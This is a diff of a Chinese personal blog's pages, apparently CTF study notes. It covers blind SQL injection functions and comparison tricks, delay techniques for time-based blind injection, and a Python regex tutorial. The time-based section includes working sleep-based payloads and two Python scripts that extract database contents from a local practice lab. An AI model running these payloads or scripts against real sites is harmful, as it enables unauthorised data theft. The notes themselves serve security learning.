+GB2312只收录了常见的一些汉字，没有办 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/11/18/%E7%9B%B2%E6%B3%A8/" title="盲注">盲注</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-11-18T09:21:04.000Z" title="发表于 2022-11-18 17:21:04">2022-11-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">盲注的两个基本问题
+1. 字符串的截取
+substr()
+substr(要截取的字符串，从哪一位开始截取，截取多长)
+注意，这里截取的开始位数是从1开始数的，substr和substring是同名函数。
+mid()
+和substr()用法基本一样，是substr()完美的替代品。
+right()
+表示截取字符串的右面几位。 right(接却的字符串，截取长度)
 到了right就不太好用了，因为substr
-()和mid()是精确截取某一位的，而right()不能这样精确的截取，它只能截取某些位。<br />
+()和mid()是精确截取某一位的，而right()不能这样精确的截取，它只能截取某些位。
 技巧：和ascii/ord
 函数一起使用，ascii()或ord()返回传入字符串的首字母的ASCII码。另外建议能用ASCII码判断，就不要直接用明文字符进行判断。理由如下：
-1.如果直接用明文字符进行判断，有一些特殊符号（单引号反斜线等）会干扰整个SQL语句的语法。2。ASCII将字符转成数字，数字可以用于大小的判断，可以二分注入，而字符基本只能用等号判断。</p>
-<p><strong>left()</strong><br />
-表示截取字符串的左面几位。 <code>left(截取的字符串，截取长度)</code>
-和right()一样，依然是个不能精确截取某一位的函数，但是也可以利用技巧实现精确截取。<br />
-技巧：和reverse()+ascii()/ord()一起使用。ascii(reverse(left(所截字符串，x)))会返回从左往右数第x位的ASCII码。</p>
-<p><strong>regexp</strong><br />
-用来判断一个字符串是否匹配一个正则表达式。这个函数兼容了截取与比较。
-<code>binary 目标字符串 regexp 正则</code>
-但是直接字符串regexp正则表达式时大小写不敏感的，需要大小写敏感需要加上binary关键字（binary不是regexp的搭档，需要把binary加到字符串的前面而不是regexp的前面，MySQL中binary是一种字符类型）</p>
-<p><strong>rlike</strong><br />
-和regexp一样。</p>
-<p><strong>trim()</strong><br />
-注入方法<br />
-trim()函数处理用于移除首位空白外，还有如下用法：<br />
-trim([both|leading|trailing] [rmstr] from
-str)表示移除str这个字符串首尾(BOTH)/句首(LEADING)/句尾(TRAILING)的rmstr<br />
-例如trim(leading 'a' from 'abcd')表示移除abcd句首的a，于是会返回bcd</p>
-<p><strong>insert()</strong>
-虽然字面意思为插入，其实是个字符串替换的函数<br />
-用法： insert(字符串，起始位置，长度，替换为什么)</p>
-<h2 id="比较">2. 比较</h2>
-<p>=&gt;&lt;<br />
-最基本的比较方法！<br />
-<strong>LIKE</strong><br />
-基本上可以用来代替等号，如果没有% _之类的字符的话。</p>
-<p><strong>RLIKE/REGEXP</strong><br />
-截取+比较的结合体</p>
-<p><strong>BETWEEN</strong><br />
-用法：expr BETWEEN 下界 AND 上界；<br />
-说明：表示是否expr&gt;=下界 &amp;&amp; exp &lt;=
-上界，有点像数学里的“闭区间”只是这里的上下界可以相等，比如expr是2
-，那么你完全可以写成2 between 2 and 2 。所以x between i and i
-就是表示x是否等于i的意思。</p>
-<p><strong>IN</strong><br />
-用法：expr1 in(expr1,expr2,expr3)
-说明：有点像数学中的元素是否属于一个集合。同样也是大小写不敏感的，为了大小写敏感需要用binary关键字。</p>
-<p><strong>AND和减法运算</strong>
-and也可以用&amp;&amp;来表示，是逻辑与的意思。<br />
-在盲注中，可以用一个true去运算一个ASCII码减去一个数字，如果返回0则说明减去的数字就是所判断的ASCII码</p>
-<p><strong>OR和减法运算</strong>
-or也可以用||来表示，是逻辑或的意思。在盲注中，可以用一个false去运算一个ASCII码减去一个数字，如果返回0则说明减去的数字就是所判断的ASCII码</p>
-<p><strong>CASE</strong> 两种用法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CASE WHEN(表达式) THEN exp1 ELSE exp2 END;# 表示如果表达式为真则返回exp1，否则返回exp2</span><br><span class="line">CASE  啥 WHEN 啥啥 THEN exp1 ELSE exp2 END;# 表示如果（啥=啥啥）则返回exp1，否则返回exp2</span><br></pre></td></tr></table></figure> <a
-target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266244">来源</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/18/%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/18/%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">延时盲注</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-18 17:15:18" itemprop="dateCreated datePublished" datetime="2022-11-18T17:15:18+08:00">2022-11-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:34:45" itemprop="dateModified" datetime="2023-04-23T17:34:45+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="基本利用-sleep">基本利用-sleep</h1>
-<p>基础利用 用法：sleep(延时的秒数)</p>
-<p>一般情况下，使用if或case构造条件表达式进行延时： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if((condition),sleep(5),0);</span><br><span class="line">CASE WHEN (condition) THEN sleep(5) ELSE 0 END;</span><br></pre></td></tr></table></figure> ##
+1.如果直接用明文字符进行判断，有一些特殊符号（单引号反斜线等）会干扰整个SQL语句的语法。2。ASCII将字符转成数字，数字可以用于大小的判断，可以二分注入，而字符基本只能用等号判断。
+left()
+表示截取字符串的左面几位。 left(截取的字符串，截取长度)
+和right()一样， ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/11/18/%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8/" title="延时盲注">延时盲注</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-11-18T09:15:18.000Z" title="发表于 2022-11-18 17:15:18">2022-11-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">基本利用-sleep
+基础利用 用法：sleep(延时的秒数)
+一般情况下，使用if或case构造条件表达式进行延时： 12if((condition),sleep(5),0);CASE WHEN (condition) THEN sleep(5) ELSE 0 END; ##
 无if和case的解决办法
 假设if和case被ban了，又想要根据condition的真假来决定是否触发sleep()，可以将conditon整合进sleep()中，做乘法即可：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(5*(condition))</span><br></pre></td></tr></table></figure>
-如果condition为真则返回1，5<em>(condition)即为5，延时5秒；如果condition为假则返回0，5</em>(condition)即为5*0为0，延时0秒</p>
-<h1 id="bypass方法">Bypass方法</h1>
-<p><strong>benchmark</strong> 是替代sleep的首选。
-用法：benchmark(执行多少次，执行什么操作)<br />
-通过修改执行的次数和执行的操作(比如sha1(sha1(sha1()))这样多套几层)，可以精准控制延时时间。</p>
-<h1 id="正则">正则</h1>
-<p>通过正则的状态机不断进行状态转换，增加比配的时长，达到延时的目的。例如：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rpad(&#x27;a&#x27;,499999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+,30),&#x27;b&#x27;);</span><br></pre></td></tr></table></figure></p>
-<h1 id="写脚本的技巧">写脚本的技巧</h1>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start_time = int(time.time())</span><br><span class="line">requests.get(url)</span><br><span class="line">end_time = int(time.time())</span><br><span class="line">if end_time - start_time &gt; 3: # 用开始时间和结束时间做差</span><br><span class="line">    print(&quot;延时发生了，注入成功&quot;)</span><br></pre></td></tr></table></figure>
-<p>这其实非常不好！因为我们发现除了sleep其他基本都不太能精准控制时长，这样写脚本就是：你延时多久我就等你多久。太慢了！如果一次延时要一个小时，你也要等他一个小时吗？很明显不太明智，正确的写延时盲注脚本的方法应该是：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.get(url,timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;延时发生了，注入成功&quot;</span>)</span><br></pre></td></tr></table></figure>
-我们利用timeout=3设置了一个3秒的延时，如果超时会抛出Exception。这样写代码的好处是：就算它要延时一年，我们也就等他3秒钟，然后就开始下一轮循坏了，不用陪着MySQL延时，大大提高了脚本的效率。</p>
-<h1 id="代码实现">代码实现</h1>
-<p>具体代码实现和布尔盲注脚本类似 下面是未改进的： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造字母表，根据字母表去爆破每一位的具体值</span></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;,&#125;&#123;_-=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目的URL</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli/Less-9/?id=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入什么数据，select就写什么子查询语句</span></span><br><span class="line">select =  <span class="string">&quot;select database()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来保存注入出的结果</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># 外层循环，从1开始，因为截取的位数是从1开始的</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># 内层循环，是具体需要测试的值</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; and if(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;ch&#125;</span>&#x27;,sleep(2),0) --+&quot;</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        t = end_time - start_time</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">2</span> :</span><br><span class="line">            result += ch</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入成功:&quot;</span>,result)</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 这一位已经跑出来了.可以break掉然后下一轮寻黄跑下一位数据了</span></span><br><span class="line">        <span class="keyword">if</span> ch == alphabet[-<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入完成&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
-<p>使用try-except改进后代码如下： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造字母表，根据字母表去爆破每一位的具体值</span></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;,&#125;&#123;_-=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目的URL</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli/Less-9/?id=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入什么数据，select就写什么子查询语句</span></span><br><span class="line">select =  <span class="string">&quot;select database()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来保存注入出的结果</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># 外层循环，从1开始，因为截取的位数是从1开始的</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># 内层循环，是具体需要测试的值</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; and if(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;ch&#125;</span>&#x27;,sleep(2),0) --+&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url+payload,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result += ch</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入成功:&quot;</span>,result)</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 这一位已经跑出来了.可以break掉然后下一轮寻黄跑下一位数据了</span></span><br><span class="line">        <span class="keyword">if</span> ch == alphabet[-<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入完成&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="post-title-link" itemprop="url">正则表达式</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-17 18:03:57" itemprop="dateCreated datePublished" datetime="2022-11-17T18:03:57+08:00">2022-11-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:34:38" itemprop="dateModified" datetime="2023-04-23T17:34:38+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/MISC/" itemprop="url" rel="index"><span itemprop="name">MISC</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>在正则表达式中，如果直接给出字符，就是精确匹配。用<code>\d</code>可以匹配一个数字，<code>\w</code>可以匹配一个字母或数字，所以：
+1sleep(5*(condition))
+如果condition为真则返回1，5(condition)即为5，延时5秒；如果condition为假则返回0，5(condition)即为5*0为0，延时0秒
+Bypass方法
+benchmark 是替代sleep的首选。
+用法：benchmark(执行多少次，执行什么操作)
+通过修改执行的次数和执行的操作(比如sha1(sha1(sha1()))这样多套几层)，可以精准控制延时时间。
+正则
+通过正则的状态机不断进行状态转换，增加比配的时长，达到延时的目的。例如 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/11/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-11-17T10:03:57.000Z" title="发表于 2022-11-17 18:03:57">2022-11-17</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/MISC/">MISC</a></span></div><div class="content">在正则表达式中，如果直接给出字符，就是精确匹配。用\d可以匹配一个数字，\w可以匹配一个字母或数字，所以：
 *
-<code>'00\d</code>可以匹配<code>'007'</code>但无法匹配<code>'00A'</code>;
-* <code>'\d\d\d'</code>可以匹配<code>'010'</code>; *
-<code>'\w\w\d'</code>可以匹配<code>'py3'</code>;<br />
-<code>.</code>可以匹配任意字符，所以： *
-<code>'py.'</code>可以匹配<code>'pyc'</code>、<code>'pyo'</code>、<code>'py!'</code>等等。<br />
-要匹配变长的字符串，在正则表达式中，用<code>*</code>表示任意个字符（包括0个），用<code>+</code>表示至少一个字符，
-用<code>?</code>表示0个或1个字符，用<code>&#123;n&#125;</code>表示n个字符，用<code>&#123;n,m&#125;</code>表示n-m个字符；<br />
-来看一个复杂的例子<code>\d&#123;3&#125;\s+\d&#123;3,8&#125;</code>。
+'00\d可以匹配'007'但无法匹配'00A';
+* '\d\d\d'可以匹配'010'; *
+'\w\w\d'可以匹配'py3';
+.可以匹配任意字符，所以： *
+'py.'可以匹配'pyc'、'pyo'、'py!'等等。
+要匹配变长的字符串，在正则表达式中，用*表示任意个字符（包括0个），用+表示至少一个字符，
+用?表示0个或1个字符，用&#123;n&#125;表示n个字符，用&#123;n,m&#125;表示n-m个字符；
+来看一个复杂的例子\d&#123;3&#125;\s+\d&#123;3,8&#125;。
 我们来从左到右解读一下： 1.
-<code>\d&#123;3&#125;</code>表示匹配3个数字，例如<code>'010'</code>; 2.
-<code>\s</code>可以匹配一个空格（也包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格，例如匹配<code>' '</code>，<code>'    '</code>等；
-3. <code>\d&#123;3,8&#125;</code>表示3-8个数字。例如<code>'1234567'</code>。
-综合起来，上面的正则表达式可以匹配任意个空格隔开的带区号的电话号码。<br />
-如果要匹配<code>'010-12345'</code>这样的电话号码呢？由于<code>'-'</code>是特殊字符，在正则表达式中，要用<code>'\'</code>转义，所以，上面的正则式<code>\d&#123;3&#125;\-\d&#123;3-8&#125;</code>。
-但是仍然无法匹配
-<code>'010 - 12345'</code>因为带有空格。所以我们需要更复杂的匹配方式。</p>
-<p><strong>进阶</strong>
-要做更精确地匹配，可以用<code>[]</code>表示范围，比如： *
-<code>[0-9a-zA-Z\_]</code> 可以匹配一个数字、字母、或者下划线; *
-<code>[0-9a-zA-Z\_+]</code>可以匹配至少由一个数字、字母、或者下划线组成的字符串，比如<code>'a100'</code>、<code>'0_Z'</code>、<code>'Py300'</code>等等;
-*
-<code>[a-zA-Z\_][0-9a-zA-Z\_]*</code>可以匹配由字母或者下划线开头，后接任意个由一个数字、字母或者下划线组成的字符串，也就是Python的合法变量；
-*
-<code>[a-zA-Z\_][0-9a-zA-Z\_]&#123;0,19&#125;</code>更精确地限制了变量地长度式1-20个字符（前面1个字符+后面最多19个字符）。<br />
-<code>A|B</code>可以匹配A或B，所以<code>(P|p)ython</code>可以匹配<code>'Python'</code>或者<code>'python'</code>。<br />
-<code>^</code>表示行的开头,<code>^\d</code>表示必须以数字开头。<br />
-<code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结束。<br />
-<code>py</code>也可以匹配<code>'python'</code>，但是加上<code>^py$</code>就变成了整行匹配，就只能匹配<code>'py'</code>了。</p>
-<hr />
-<h1 id="re模块">re模块</h1>
-<p>由于Python的字符串本身也用<code>\</code>转义，所以要特别注意：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;ABC\\-001&#x27;</span> <span class="comment"># python的字符串</span></span><br><span class="line"><span class="comment"># 对应的正则表达式字符串变成：</span></span><br><span class="line"><span class="comment"># &#x27;ABC\-001&#x27;</span></span><br></pre></td></tr></table></figure>
-因此我们强烈建议用python的<code>r</code>前缀，就不用考虑转义的问题了：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">r&#x27;ABC\-001&#x27;</span> <span class="comment"># python的字符串</span></span><br><span class="line"><span class="comment"># 对应的正则表达式字符串不变：</span></span><br><span class="line"><span class="comment"># &#x27;ABC\-001&#x27;</span></span><br></pre></td></tr></table></figure>
-<code>match()</code>方法判断是否匹配，如果匹配成功，返回一个<code>Match</code>对象，否则返回<code>None</code>。常见的判断方法是：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test = <span class="string">&#x27;用户输入的字符串&#x27;</span></span><br><span class="line"><span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;正则表达式&#x27;</span>,test):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;failed&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
-<h2 id="切分字符串"><strong>切分字符串</strong></h2>
-<p>用正则表达式切分字符串比用固定的字符更灵活，请看正常的切分代码：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;a b   c&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure> 无法识别连续的空格，用正则表达式试试： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;re.split(<span class="string">r&#x27;\s+&#x27;</span>,<span class="string">&#x27;a b   c&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure></p>
-<p>无论多少个空格都能正常分割。加入<code>,</code>试试： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;re.split(<span class="string">r&#x27;[\s\,]+&#x27;</span>,<span class="string">&#x27;a,b, c  d&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br></pre></td></tr></table></figure>
-再加入<code>;</code>试试： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[\s\,\;]+&#x27;</span>,<span class="string">&#x27;a,b;; c    d&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br></pre></td></tr></table></figure>
-如果用户输入了一组标签，下次记得用正则表达式来把不规范的输入转化成正确的数组。</p>
-<h2 id="分组"><strong>分组</strong></h2>
-<p>除了简单地判断是否匹配之外，正则表达式还有提取字串的强大功能。用<code>()</code>表示的就是要提取的分组(Group)。比如：<code>^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$</code>分别定义了两个组，可以直接从匹配的字符串中提取出区号和本地号码：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>m=re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;</span>,<span class="string">&#x27;010-12345&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;010-12345&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;010&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;12345&#x27;</span></span><br></pre></td></tr></table></figure>
-如果正则表达式中定义了组，就可以在<code>MATCH</code>对象上用<code>group()</code>方法提取出子串来。<br />
-注意到<code>group(0)</code>永远是与整个正则表达式相匹配的字符串，<code>group(1)</code>、<code>group(2)</code>……表示第1、2、……个子串。<br />
-提取子串非常有用。来看一个更凶残的例子： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = <span class="string">&#x27;19:05:30&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.<span class="keyword">match</span>(<span class="string">r&#x27;^(0[0-9]|1[0-9]|2[0-3]|[0_9])\:(0[0-9]|1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]|[0-9])\:(0[0-9]|1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]|[0-9])$&#x27;</span>,t)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.groups()</span><br><span class="line">(<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;05&#x27;</span>,<span class="string">&#x27;30&#x27;</span>)</span><br></pre></td></tr></table></figure>
-这个正则表达式可以直接识别合法的时间。但是有些时候，用正则表达式也无法做到完全验证，比如识别日期：<br />
